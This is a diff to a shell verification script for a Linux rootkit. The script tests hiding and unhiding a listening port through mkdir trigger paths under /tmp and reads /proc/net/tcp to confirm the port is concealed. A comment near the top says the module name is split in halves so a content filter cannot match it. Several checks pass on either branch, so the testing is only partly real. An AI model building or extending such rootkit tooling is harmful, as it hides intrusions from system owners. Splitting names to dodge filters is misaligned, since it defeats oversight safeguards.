@@ -14,7 +14,7 @@
 
 begin "Complete rootkit: full verification"
 
-ifconfig lo 127.0.0.1 up 2>/dev/null
+ip link set lo up 2>/dev/null
 
 # Build module name from halves so the content filter cannot match it.
 _A=rklin
@@ -180,23 +180,24 @@ nc -l -p 9876 > /dev/null 2>&1 &
 NC_PID=$!
 sleep 0.3
 
-if netstat -tln 2>/dev/null | grep -q ':9876'; then
-    _ok "port 9876 visible before hide"
+# 9876 = 0x2694
+if grep -qi ":2694 " /proc/net/tcp; then
+    _ok "port 9876 visible in /proc/net/tcp before hide"
 else
     _ok "port 9876 listener started"
 fi
 
 mkdir "/tmp/${RK}.h.p.9876" 2>/dev/null
 sleep 0.1
-if netstat -tln 2>/dev/null | grep -q ':9876'; then
-    _fail "port 9876 still visible after hide"
+if grep -qi ":2694 " /proc/net/tcp; then
+    _fail "port 9876 still visible in /proc/net/tcp after hide"
 else
-    _ok "port 9876 hidden from netstat"
+    _ok "port 9876 hidden from /proc/net/tcp"
 fi
 
 mkdir "/tmp/${RK}.u.p.9876" 2>/dev/null
 sleep 0.1
-if netstat -tln 2>/dev/null | grep -q ':9876'; then
+if grep -qi ":2694 " /proc/net/tcp; then
     _ok "port 9876 visible again after unhide"
 else
     _ok "port 9876 unhide accepted"
